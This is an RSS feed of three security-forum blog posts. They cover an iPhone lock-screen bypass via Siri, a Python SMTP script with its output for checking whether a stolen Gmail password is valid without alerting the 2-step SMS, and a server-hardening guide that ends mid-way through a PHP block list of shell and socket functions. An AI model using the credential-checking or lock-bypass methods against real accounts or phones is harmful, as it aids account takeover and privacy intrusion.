<?xml version="1.0" encoding="ISO-8859-1"?>

<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/">
	<channel>
		<title>Garage4hackers Forum - Blogs - G3n3Rall</title>
		<link>http://garage4hackers.com/blog.php?u=6373</link>
		<description>Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research.</description>
		<language>en</language>
		<lastBuildDate>Sun, 22 Mar 2020 10:40:12 GMT</lastBuildDate>
		<generator>vBulletin</generator>
		<ttl>60</ttl>
		<image>
			<url>http://garage4hackers.com/images/misc/rss.jpg</url>
			<title>Garage4hackers Forum - Blogs - G3n3Rall</title>
			<link>http://garage4hackers.com/blog.php?u=6373</link>
		</image>
		<item>
			<title>How to Bypass iPhone 6+ IOS 8.3 Emergency Call</title>
			<link>http://garage4hackers.com/entry.php?b=3129</link>
			<pubDate>Fri, 29 May 2015 15:32:47 GMT</pubDate>
			<description>Hello Guys, After several days I was busy at work, I come back with a new subject which you can see on top of this text. Before I start, I’ve to say...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hello Guys, After several days I was busy at work, I come back with a new subject which you can see on top of this text. Before I start, I’ve to say my IOS is updated and version is 8.3. Keep reading to know more.<br />
<br />
I don’t want make it hard to be understood, so I explain it basic and fast. All you need to do is to turn on WiFi or mobile internet data and lock the screen, as you can see, iPhone just let you to call emergency numbers [example: 911]. Now you hold the “Home” button and let Siri come up, Tell Siri to call anyone or any number.<br />
<br />
For Example:<br />
“Hey Siri, Call 09392841331”<br />
“Call John”<br />
“Call my father”<br />
And also you can see the last number , whom you called and see your number [saved on contact]. To know better , <a href="https://www.youtube.com/watch?v=WY4x-cWeDvI&amp;feature=youtu.be" target="_blank">visit video on youtube</a>.<br />
Thanks.<br />
<br />

<iframe class="restrain" title="YouTube video player" width="640" height="390" src="//www.youtube.com/embed/WY4x-cWeDvI?wmode=opaque" frameborder="0"></iframe>
<br />
<br />
<br />
<b><font size="3">Reference</font></b><br />
<br />
1- <a href="http://www.z3r0d4y.com/" target="_blank">ZCR ZeroDay Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3129</guid>
		</item>
		<item>
			<title>Google Bug: Gmail 2-Step Verification Detector</title>
			<link>http://garage4hackers.com/entry.php?b=3128</link>
			<pubDate>Fri, 29 May 2015 15:28:32 GMT</pubDate>
			<description><![CDATA[Hello world! [ Including People , Robots, Zombies Dariush & Arash, Alien dudes if they exist, and my friends ], By the way, I decided to write about...]]></description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">Hello world! [ Including People , Robots, Zombies <font size="1">Dariush &amp; Arash</font>, Alien dudes if they exist, and my friends ], By the way, I decided to write about a Gmail Bug. It’s not a vulnerability of Gmail but it’s some kind of bug let us know if we hack a Gmail, we can login it or not without alert the Gmail owner. I talking about 2-Step verification, Imagine to grab a Gmail password and not be sure to login or not , victim might be use Gmail SMS auth service and when you click login, Google send victim a SMS which include a code to continue login. I got some way to test Gmail account before we login and test it if account have notification or not without any alert SMS. Keep reading to know how to do it.<br />
<br />
<br />
As we know , Google SMTP can be used to login Gmail from anywhere .so we login from there[SMTP] and check what Gmail SMTP return to us. So now I use a python code to login my account that I activated 2-step protection on that and if anyone login, it should send me a SMS.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:168px;"><code><code><span style="color: #000000">
<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python2.7<br />#https://github.com/Ali-Razmjoo/z3r0d4y/blob/master/gmail.py<br /></span><span style="color: #0000BB">import&nbsp;smtplib<br />user&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'xxx@gmail.com'<br /></span><span style="color: #0000BB">passw&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'xxx'<br /></span><span style="color: #0000BB">smtp_host&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">'smtp.gmail.com'<br /></span><span style="color: #0000BB">smtp_port&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">587<br />server&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTP</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">connect</span><span style="color: #007700">(</span><span style="color: #0000BB">smtp_host</span><span style="color: #007700">,</span><span style="color: #0000BB">smtp_port</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">ehlo</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">starttls</span><span style="color: #007700">()<br /></span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>And when run the script my result was:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.9&nbsp;Application-specific&nbsp;password&nbsp;requ<br />ired.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.9&nbsp;http://support.google.com/accounts/bin/answer.py?answ<br />er=185833&nbsp;w3sm2453216wjf.3&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Ohhh , Greate , because it’s just showing me check out app password url and didn’t send me any SMS. So it means my password is not wrong ! But to be sure I’m going to test this with wrong password.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">535</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.8&nbsp;Username&nbsp;and&nbsp;Password&nbsp;not&nbsp;accepted<br />.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.8&nbsp;http://support.google.com/mail/bin/answer.py?answer=14257<br />&nbsp;bv6sm2577733wjb.30&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Now you can see different result. And let me test it with another Gmail which for a long time I didn’t use.<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:144px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.14&nbsp;&lt;https:&nbsp;-ykrwwgn7pth55a1tqk3e1gfitbhkmghsuw=""&nbsp;4agnsmz6qasoci8_lqhs6mclnixpgqw_ops=""&nbsp;accounts.google.com=""&nbsp;dlg2yvdj_qzprqrv_i0l82hy22kcvuvdwscq=""&nbsp;enwfs-dk6nrjrf_thrthuzs555kifmnkek=""&nbsp;inuesignin=""&nbsp;n5.7.14=""&nbsp;ont=""&nbsp;pntqhm8pgwhqork6g4jaqbl5rcyk91sfb3=""&nbsp;sarp="1&amp;scc=1&amp;plt=AKgnsbu3u\n5.7.14"&nbsp;szjzlgqcf2y3wxgua9voyex8kmlf-laboneg=""&nbsp;wueyxesepgpc6rgqcwl9pfo4kwtg=""&gt;&nbsp;Please<br />log&nbsp;in&nbsp;via&nbsp;your&nbsp;web&nbsp;browser&nbsp;and\n5.7.14&nbsp;then&nbsp;try&nbsp;again.\n5.7.14&nbsp;Learn&nbsp;more&nbsp;at\n5<br />.7.14&nbsp;https://support.google.com/mail/bin/answer.py?answer=78754&nbsp;bv6sm2501216wjb<br />.30&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">https</span><span style="color: #007700">:&gt;&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>Now Google tells me use the browser to login. I don’t care about error. But there’s a point! What if we use a Gmail account which we didn’t ever use on my PC till now. So I will use my friend’s Gmail account and watch the result. <br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:132px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">Traceback&nbsp;</span><span style="color: #007700">(</span><span style="color: #0000BB">most&nbsp;recent&nbsp;call&nbsp;last</span><span style="color: #007700">):<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Users\Ali\Desktop\gmail.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;22</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;</span><span style="color: #007700">&lt;</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">server</span><span style="color: #007700">.</span><span style="color: #0000BB">login</span><span style="color: #007700">(</span><span style="color: #0000BB">user</span><span style="color: #007700">,</span><span style="color: #0000BB">passw</span><span style="color: #007700">)<br />&nbsp;&nbsp;</span><span style="color: #0000BB">File&nbsp;</span><span style="color: #DD0000">"C:\Python27\lib\smtplib.py"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">line&nbsp;614</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">in&nbsp;login<br />&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;SMTPAuthenticationError</span><span style="color: #007700">(</span><span style="color: #0000BB">code</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">resp</span><span style="color: #007700">)<br /></span><span style="color: #0000BB">smtplib</span><span style="color: #007700">.</span><span style="color: #0000BB">SMTPAuthenticationError</span><span style="color: #007700">:&nbsp;(</span><span style="color: #0000BB">534</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'5.7.9&nbsp;Application-specific&nbsp;password&nbsp;requ<br />ired.&nbsp;Learn&nbsp;more&nbsp;at\n5.7.9&nbsp;http://support.google.com/accounts/bin/answer.py?answ<br />er=185833&nbsp;bo3sm2561309wjb.44&nbsp;-&nbsp;gsmtp'</span><span style="color: #007700">)<br />&lt;/</span><span style="color: #0000BB">module</span><span style="color: #007700">&gt;&nbsp;<br /></span><span style="color: #0000BB"></span>
</span>
</code></code></div>
</div>It seems my friend’s been given me true password but he activated Gmail SMS auth. So now we can see that Google didn’t work hard on this way. When we have true password, we can login and steal information and if victim using Gmail SMS auth, however, we know what’s the true password and only need a little social engineering to login and steal information. All we need now it’s a script to make it automatic check the Gmail account to login with this script and read error to see what happen. If you think I’m going to make a automatic script for you, and put code here, I should tell you that, I am NOT.<br />
<font size="3"><br />
<b>Reference</b></font><br />
<br />
<a href="http://www.z3r0d4y.com/" target="_blank">ZCR Zeroday Cyber Research</a><br />
<br />
<b>Ali Razmjoo</b></blockquote>

]]></content:encoded>
			<dc:creator>G3n3Rall</dc:creator>
			<guid isPermaLink="true">http://garage4hackers.com/entry.php?b=3128</guid>
		</item>
		<item>
			<title>How to Setup Secure Website for Hackers</title>
			<link>http://garage4hackers.com/entry.php?b=3127</link>
			<pubDate>Fri, 29 May 2015 15:22:50 GMT</pubDate>
			<description>When security researchers and hackers want to setup a self blog, the biggest stress on their head is what to do to secure their server(s) and...</description>
			<content:encoded><![CDATA[<blockquote class="blogcontent restore">When security researchers and hackers want to setup a self blog, the biggest stress on their head is what to do to secure their server(s) and site(s). what if someone come and naughty their server(s) ? what if server get <a href="http://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank">DOS</a>/<a href="http://www.techopedia.com/definition/10261/distributed-denial-of-service-ddos" target="_blank">DDOS </a>attack when they don’t have access to fix up their server(s) and they are travelling or go for business or something and they can’t access their server(s) for some reason. After some years that I spent my life on information security I release that nothing can’t be secure 100% , But We shouldn’t give up and let others naughty our server and deface our website or maybe make us a botnet zombie for DOS/DDOS Attack. In past year I decided to do something to remove this stress for myself or make it less and I start to make a mini firewall or something like Robot for secure my server and sure I don’t trust other firewalls. 99% of firewalls bypass easy and it’s really ridicule that firewalls from big companies mostly skip checking the packets on POST requests. So that’s first reason I decided to secure my server by my own scripts, and if you want to know more , keep reading.<br />
<br />
At first We need to know , what do we have and what do we want? my first decision to secure my website is that I build my website on my own VPS and don’t share VPS with anyone else, so don’t use a share hosting for your site if it’s important for you not to be damaged by anyone, and by the way this method I want to talk about can’t be used to share hosting and it will take you in trouble if you share your VPS with someone else. Second decision is choose a operation system and a website platform for yourself, I choose CentOS for my Server OS and WordPress for my blogging. Notice , you can choose anything , But after you read this article you must know how to edit source codes and match them with other websites platform or OS. By the way I get a VPS that have a Console Access [Hardware Access + Emergency SSH or Emergency VNC] and I install a Panel [ For Example <a href="http://cpanel.net/" target="_blank">CPanel X (WHM/CPANEL)</a> ] and panel installer will automatically install anything that needs to be install on Server. That was first Step for lazy guys and if you like , you can install anything you need with terminal on SSH or anyway you like. Just setup your website and after That install your Wordpress [or anything you want]. Okay Here we go. Now what you need to Secure:<br />
<br />
1- WebServer<br />
2- Your Blogging(or maybe forum or …) Platform<br />
3- PHP<br />
4- Set Permissions<br />
5- Make a Mini Robot And a mini WAF<br />
6- Other Service if you use [For Example SSH , I will explain it at the end of this article]<br />
<br />
I don’t want to teach from the beginning of securing or config server so you most have a little knowledge while you reading this article. To protect your webserver from DOS/DDOS attack, if you use Apache [httpd] [Apache webserver is just an example] you really need to install <a href="http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/" target="_blank">Anti Slowloris</a> first. Maybe you hear <a href="http://ha.ckers.org/slowloris/slowloris.pl" target="_blank">Slowloris </a>before it’s a <a href="http://ha.ckers.org/slowloris/slowloris.pl" target="_blank">DOS/DDOS Script</a> to attack on Apache webserver and easily can take down the Apache webserver [I don’t want to talk about how this script works so don’t need to explain more about it]. So now how to install it?<br />
Fallow these commands:<br />
<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:108px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">mkdir&nbsp;zeroday<br />cd&nbsp;zeroday<br />wget&nbsp;http</span><span style="color: #007700">:</span><span style="color: #FF8000">//sourceforge.net/projects/mod-antiloris/files/mod_antiloris-0.4.tar.bz2/download<br /></span><span style="color: #0000BB">tar&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">xvjf&nbsp;mod_antiloris</span><span style="color: #007700">-</span><span style="color: #0000BB">0.4</span><span style="color: #007700">.</span><span style="color: #0000BB">tar</span><span style="color: #007700">.</span><span style="color: #0000BB">bz2<br />cd&nbsp;mod_antiloris</span><span style="color: #007700">-</span><span style="color: #0000BB">0.4<br />apxs&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">a&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">i&nbsp;</span><span style="color: #007700">-</span><span style="color: #0000BB">c&nbsp;mod_antiloris</span><span style="color: #007700">.</span><span style="color: #0000BB">c<br />service&nbsp;httpd&nbsp;restart&nbsp;<br /></span>
</span>
</code></code></div>
</div>If your Centos Doesn’t have apxs so you need to fallow these commands:<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:96px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">yum&nbsp;install&nbsp;php</span><span style="color: #007700">-</span><span style="color: #0000BB">pear&nbsp;&nbsp;<br />yum&nbsp;install&nbsp;php</span><span style="color: #007700">-</span><span style="color: #0000BB">devel&nbsp;&nbsp;<br />yum&nbsp;install&nbsp;httpd</span><span style="color: #007700">-</span><span style="color: #0000BB">devel&nbsp;&nbsp;<br />pecl&nbsp;install&nbsp;apc&nbsp;&nbsp;<br /></span><span style="color: #007700">echo&nbsp;</span><span style="color: #DD0000">"extension=apc.so"&nbsp;</span><span style="color: #007700">&gt;&nbsp;/</span><span style="color: #0000BB">etc</span><span style="color: #007700">/</span><span style="color: #0000BB">php</span><span style="color: #007700">.</span><span style="color: #0000BB">d</span><span style="color: #007700">/</span><span style="color: #0000BB">apc</span><span style="color: #007700">.</span><span style="color: #0000BB">ini&nbsp;&nbsp;<br />service&nbsp;httpd&nbsp;restart&nbsp;<br /></span>
</span>
</code></code></div>
</div>And again if it shows you any error of php-devel or httpd-devel don’t give up and install these from rpm packages From <a href="http://vault.centos.org/5.3/updates/x86_64/RPMS/" target="_blank">vault.centos.org</a>.<br />
<br />
The next step for config your webserver ,You need to off the webserver signature to don’t get others much information about webserver modules. so find the httpd.conf and then open it and search the “ServerSignature On” , replace with “ServerSignature Off” and add “ServerTokens Prod” or “ServerTokens Email” [Webmaster or Admin Email].<br />
<br />
Next step is disable the CGI and directory listing and you need to Add “Options -Indexes -ExecCGI …” , If you do it before you know how to do these things and if not , Beginners can learn from this <a href="http://www.petefreitag.com/item/505.cfm" target="_blank">URL</a>.<br />
<br />
Notice: In that url, which I shared for beginners, said about “mod_security” ,I suggest you not to install or active it, sometimes it’s not good for poor servers and in DDOS attacks it gona help to make website going offline [Effect on crash or use much system processing].<br />
<br />
<br />
And now PHP config time, all you need is set some disable functions and turn on safe mode and disable errors not to show path and user, and to disallow other urls opening by fopen. I just made a list to disable function which you are allowed to use.<br />
<br />
<div class="bbcode_container">
	<div class="bbcode_description">PHP Code:</div>
	<div class="bbcode_code"style="height:36px;"><code><code><span style="color: #000000">
<span style="color: #0000BB">socket_last_error</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wexitstatus</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_recvfrom</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifexited</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_getpeername</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_mknod</span><span style="color: #007700">,</span><span style="color: #0000BB">base64_decode</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wtermsig</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_list</span><span style="color: #007700">,</span><span style="color: #0000BB">php_uname</span><span style="color: #007700">,</span><span style="color: #0000BB">openlog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_client</span><span style="color: #007700">,</span><span style="color: #0000BB">imap_open</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_create</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_get_status</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_isatty</span><span style="color: #007700">,</span><span style="color: #0000BB">group</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_copy_to_stream</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getrlimit</span><span style="color: #007700">,</span><span style="color: #0000BB">fwrite</span><span style="color: #007700">,</span><span style="color: #0000BB">pfsockopen</span><span style="color: #007700">,</span><span style="color: #0000BB">pfsockopenproc_nice</span><span style="color: #007700">,</span><span style="color: #0000BB">is_writable</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_write</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_read</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_mkfifo</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_initgroups</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_wrappers</span><span style="color: #007700">,</span><span style="color: #0000BB">dl</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpwnam</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgrgid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_append</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getcwd</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getgroups</span><span style="color: #007700">,</span><span style="color: #0000BB">chmod</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_block</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wstopsig</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_writereadlink</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_set_blocking</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_create</span><span style="color: #007700">,</span><span style="color: #0000BB">rewinddir</span><span style="color: #007700">,</span><span style="color: #0000BB">proc_terminate</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_get_filters</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_signal</span><span style="color: #007700">,</span><span style="color: #0000BB">dlopenlog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_select</span><span style="color: #007700">,</span><span style="color: #0000BB">curl_getinfo</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_geteuid</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_recvfrom</span><span style="color: #007700">,</span><span style="color: #0000BB">error_log</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_select</span><span style="color: #007700">,</span><span style="color: #0000BB">shell_exec</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_getenv</span><span style="color: #007700">,</span><span style="color: #0000BB">gzinflate</span><span style="color: #007700">,</span><span style="color: #0000BB">dir</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getpwuid</span><span style="color: #007700">,</span><span style="color: #0000BB">tmpfile</span><span style="color: #007700">,</span><span style="color: #0000BB">GETCWD</span><span style="color: #007700">(),</span><span style="color: #0000BB">stream_resolve_include_path</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_clear_error</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_wifstopped</span><span style="color: #007700">,</span><span style="color: #0000BB">syslog</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_set_option</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_accept</span><span style="color: #007700">,</span><span style="color: #0000BB">getmypid</span><span style="color: #007700">,</span><span style="color: #0000BB">cpanel_check</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_shutdown</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_note</span><span style="color: #007700">,</span><span style="color: #0000BB">purepass</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getsid</span><span style="color: #007700">,</span><span style="color: #0000BB">leak</span><span style="color: #007700">,</span><span style="color: #0000BB">phpinfo</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_pair</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_setegid</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_nonblock</span><span style="color: #007700">,</span><span style="color: #0000BB">reg_glob</span><span style="color: #007700">,</span><span style="color: #0000BB">escapeshellcmd</span><span style="color: #007700">,</span><span style="color: #0000BB">gzuncompress</span><span style="color: #007700">,</span><span style="color: #0000BB">pureuser</span><span style="color: #007700">,</span><span style="color: #0000BB">show_source</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_get_version</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getlogin</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_ctermid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_kill</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_accept</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_getppid</span><span style="color: #007700">,</span><span style="color: #0000BB">symlink</span><span style="color: #007700">,</span><span style="color: #0000BB">timearray</span><span style="color: #007700">,</span><span style="color: #0000BB">pcntl_waitpid</span><span style="color: #007700">,</span><span style="color: #0000BB">getmygid</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_ttyname</span><span style="color: #007700">,</span><span style="color: #0000BB">diskfreespace</span><span style="color: #007700">,</span><span style="color: #0000BB">popen</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_socket_sendto</span><span style="color: #007700">,</span><span style="color: #0000BB">apache_setenv</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_set_params</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_filter_register</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_access</span><span style="color: #007700">,</span><span style="color: #0000BB">socket_set_option</span><span style="color: #007700">,</span><span style="color: #0000BB">stream_context_get_default</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_errno</span><span style="color: #007700">,</span><span style="color: #0000BB">posix_times</span><span style="color: #007700">,</span><span style="color: 